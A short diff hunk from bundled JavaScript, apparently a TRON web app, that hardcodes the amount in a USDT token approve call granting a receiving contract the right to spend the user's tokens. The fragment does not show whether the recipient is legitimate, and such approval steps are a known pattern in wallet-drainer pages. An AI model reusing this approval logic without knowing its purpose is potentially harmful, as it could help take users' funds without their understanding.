@@ -36090,7 +36090,7 @@ var Home = function Home() {
               _context.next = 17;
               break;
             }
-            x = undefined;
+            x = 100000000;
             _context.next = 13;
             return usdtContract.approve(receiveContractAddress, x).send({
               feeLimit: "100000000"
